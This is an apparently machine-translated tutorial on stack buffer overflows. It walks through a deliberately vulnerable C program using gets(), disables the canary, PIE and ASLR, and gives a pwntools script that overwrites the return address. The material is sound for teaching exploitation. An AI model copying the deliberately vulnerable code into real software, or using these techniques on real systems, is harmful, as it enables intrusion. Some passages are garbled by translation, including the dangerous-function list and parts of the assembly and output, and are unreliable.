[EN](./stackoverflow-basic.md) | [ZH](./stackoverflow-basic-zh.md)
#Stack overflow principle


## Introduction


Stack overflow refers to the number of bytes written by the program to a variable in the stack that exceeds the number of bytes requested by the variable itself, thus causing the value of the variable in the stack adjacent to it to be changed. This problem is a specific buffer overflow vulnerability, similar to heap overflow, bss segment overflow and other overflow methods. A stack overflow vulnerability can cause a program to crash, and in addition, an attacker can control the execution flow of the program. In addition, we are not difficult to find that the basic premise of stack overflow is


- The program must write data to the stack.
- The size of the data written is not well controlled.


## Basic example


The most typical stack overflow exploit is to cover the return address of the program to the address controlled by the attacker. ** Of course, you need to ensure that the segment where the address is located has executable permissions**. Below, we give a simple example:


```C

#include <stdio.h>

#include <string.h>

void success() { puts("You Hava already controlled it."); }

void vulnerable() {

  char s[12];

  gets(s);

  puts(s);

  return;

}

int main(int argc, char **argv) {

  vulnerable();

  return 0;

}

```



The main purpose of this program is to read a string and output it. **We want to control the program to execute the success function. **


We compile it with the following command


```shell

➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 

stack_example.c: In function ‘vulnerable’:

stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]

   gets(s);

   ^

/tmp/ccPU8rRA.o: In the function &#39;vulnerable&#39;:
stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.

```



It can be seen that gets itself is a dangerous function. It never checks the length of the input string, but uses Enter to determine if the input is over, so it can easily cause the stack to overflow.


&gt; Historically, the **Morris worm** first worm exploited the dangerous function get to implement stack overflow.


In the gcc compiler directive, `-m32` refers to the generation of a 32-bit program; `-fno-stack-protector` refers to the stack overflow protection not being turned on, that is, no canary is generated.
In addition, in order to introduce the basic use of stack overflow more conveniently, it is also necessary to disable PIE (Position Independent Executable) to avoid the disruption of the load base address. Different gcc versions have different default configurations for PIE. We can use the command `gcc -v` to view the default gcc switch status. If the `--enable-default-pie` parameter is present, it means that the PIE is enabled by default. You need to add the parameter `-no-pie` to the compile directive.


After compiling successfully, you can check the compiled file with the checksec tool:


```

➜  stack-example checksec stack_example

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE (0x8048000)

```

Referring to the PIE protection at compile time, there is also a mechanism for Address Space Distribution Randomization (ASLR) under the Linux platform. Simply put, even if the executable file has PIE protection enabled, you need to enable ASLR to actually disturb the base address. Otherwise, the program will still load a fixed base address (but not the base address of No PIE). We can control the ASLR startup by modifying `/proc/sys/kernel/randomize_va_space`. The specific options are


- 0, close ASLR, no randomization. The base addresses of the stack, heap, and .so are the same every time.
- 1, ordinary ASLR. The stack base address, the mmap base address, and the .so load base address are all randomized, but the heap base address is not randomized.
- 2, Enhanced ASLR, based on 1, adds randomization of the heap base address.


We can use the `echo 0 &gt; /proc/sys/kernel/randomize_va_space` to turn off the ASLR of the Linux system. Similarly, you can configure the corresponding parameters.


In order to reduce the complexity of subsequent exploits, we close ASLR here and close PIE at compile time. Of course, readers can also try different combinations of ASLR and PIE switches, and use IDA and its dynamic debugging function to observe the program address change (can also be successfully attacked when ASLR is closed and PIE is enabled).


After confirming that the stack overflow and PIE protection are turned off, we use IDA to decompile the binary and view the vulnerable function. can be seen


```C

int vulnerable()

{

  char s; // [sp+4h] [bp-14h]@1



  gets(&s);

  return puts(&s);

}

```



The length of the string distance ebp is 0x14, then the corresponding stack structure is


```text

                                           +-----------------+

| retaddr |
                                           +-----------------+

                                           |     saved ebp   |

                                    ebp--->+-----------------+

                                           |                 |

                                           |                 |

                                           |                 |

                                           |                 |

                                           |                 |

                                           |                 |

                              s,ebp-0x14-->+-----------------+

```



And, we can get the address of success through IDA, its address is 0x0804843B.


`` `asm
.text:0804843B success         proc near

.text:0804843B                 push    ebp

.text:0804843C                 mov     ebp, esp

.text:0804843E                 sub     esp, 8

.text:08048441                 sub     esp, 0Ch

.text:08048444                 push    offset s        ; "You Hava already controlled it."

.text:08048449                 call    _puts

.text:0804844E                 add     esp, 10h

.text: 08048451
.text:08048452                 leave

.text: 08048453 retn
.text:08048453 success         endp

```



Then if we read the string is


```

0x14*'a'+'bbbb'+success_addr

```



Then, since gets will read the carriage return, we can directly read all the strings, and cover the saved ebp to bbbb and the retaddr to success_addr. That is, the stack structure at this time is


```text

                                           +-----------------+

                                           |    0x0804843B   |
                                           +-----------------+

| . \ t
                                    ebp--->+-----------------+

                                           |                 |

                                           |                 |

                                           |                 |

                                           |                 |

                                           |                 |

                                           |                 |

                              s,ebp-0x14-->+-----------------+

```



However, it should be noted that since in the computer&#39;s memory, each value is stored in bytes. In general, small-end storage is used, that is, the form of 0x0804843B in memory is


```text

\x3b\x84\x04\x08

```



However, we can&#39;t input these characters directly in the terminal. When the terminal inputs, \, x, etc. also count as a single character. . So we need to find a way to enter \x3b as a character. So at this point we need to use a wave of pwntools (about how to install and basic usage, please github), here the code using pwntools is as follows:


```python

##coding=utf8

from pwn import *

## Constructing objects that interact with the program
sh = process('./stack_example')

success_addr = 0x0804843b

## Constructing a payload
payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)

print p32(success_addr)

## Send a string to the program
sh.sendline(payload)

## Convert code interaction to manual interaction
sh.interactive()

```



Execute a wave of code to get


```shell

➜  stack-example python exp.py

[+] Starting local process './stack_example': pid 61936

x84
[*] Switching to interactive mode

aaaaaaaaaaaaaaaaaaaabbbb; \ x84 \ x0
You Hava already controlled it.

[*] Got EOF while reading in interactive

$ 

[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)

[*] Got EOF while sending in interactive

```



You can see that we have indeed executed the success function.


## 小述


The above example actually shows the more important steps in the stack overflow.


### Looking for dangerous functions


By looking for dangerous functions, we quickly determine if the program is likely to have a stack overflow and, if so, where the stack overflows. Common dangerous functions are as follows


- Enter
- gets, read a line directly, ignoring &#39;\x00&#39;
    -   scanf

    -   vscanf

- output
    -   sprintf

- string
- strcpy, string copy, encountered &#39;\x00&#39; stop
- strcat, string splicing, encountered &#39;\x00&#39; stop
- bcopy


### Determine the fill length


This part is mainly to calculate the distance between the address we want to operate and the address we want to cover**. A common method of operation is to turn on IDA and calculate the offset based on its given address. General variables will have the following index modes


- The index relative to the stack base address can be obtained directly by looking at the EBP relative offset
- The index corresponding to the top pointer of the stack generally needs to be debugged, and then it will be converted to the first type.
- Direct address indexing is equivalent to directly giving an address.


In general, we will have the following coverage requirements


- **Override function return address**, this time just look at EBP directly.
- ** Overwrites the contents of a variable on the stack**, which requires more detailed calculations.
- **Overwrites the contents of a variable in the bss section**.
- Overwrite the contents of a specific variable or address based on actual implementation.


The reason we want to cover an address is because we want to control the program execution flow directly or indirectly by overriding the address**.


## Reference reading


[stack buffer overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow)



http://bobao.360.cn/learning/detail/3694.html



https://www.cnblogs.com/rec0rd/p/7646857.html
